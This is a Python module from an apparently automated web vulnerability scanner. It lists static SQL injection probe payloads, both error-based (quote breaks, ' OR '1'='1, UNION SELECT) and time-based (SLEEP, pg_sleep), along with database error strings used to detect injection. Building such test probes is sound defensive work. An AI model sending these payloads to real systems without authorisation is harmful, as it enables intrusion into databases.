"""Curated SQLi probe library. Payloads are static; the AI never generates them."""
from app.testing.models import Probe

MODULE = "sqli"

ERROR_PAYLOADS: tuple[str, ...] = (
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' UNION SELECT NULL-- ",
)

TIME_PAYLOADS: tuple[str, ...] = (
    "' AND SLEEP(2)-- ",
    '" AND SLEEP(2)-- ',
    "'; SELECT pg_sleep(2)-- ",
)

SQLI_ERROR_MARKERS: tuple[str, ...] = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-01756",
    "ora-00933",
    "postgresql",
    "pg_query()",
    "sqlite3::",
    "sqlite error",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error",
)


def error_probes(param: str) -> list[Probe]:
    return [Probe(module=MODULE, kind="error-based", param=param, payload=payload) for payload in ERROR_PAYLOADS]


def time_probes(param: str) -> list[Probe]:
    return [Probe(module=MODULE, kind="time-based", param=param, payload=payload) for payload in TIME_PAYLOADS]


def sqli_probes(param: str) -> list[Probe]:
    return [*error_probes(param), *time_probes(param)]
